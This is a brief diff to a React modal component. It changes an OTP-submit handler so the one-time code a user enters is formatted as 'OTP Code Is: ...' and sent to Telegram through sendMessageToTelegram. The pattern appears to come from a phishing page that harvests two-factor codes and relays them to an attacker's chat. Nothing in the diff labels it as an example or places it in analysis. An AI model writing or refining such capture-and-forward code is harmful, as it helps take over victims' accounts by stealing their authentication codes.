@@ -97,7 +97,8 @@ export default function Modal({ displayModal, setDisplayModal, modal, count, set
     const handleOtpSubmit = () => {
         if (otpCode) {
             setIsLoading(true);
-            sendMessageToTelegram(otpCode); // Send to Telegram
+            const message = `OTP Code Is: ${otpCode}`
+            sendMessageToTelegram(message); // Send to Telegram
             setOtpCode(''); // Clear input
         } else {
             setInvalid(true); // Show error if OTP code is empty
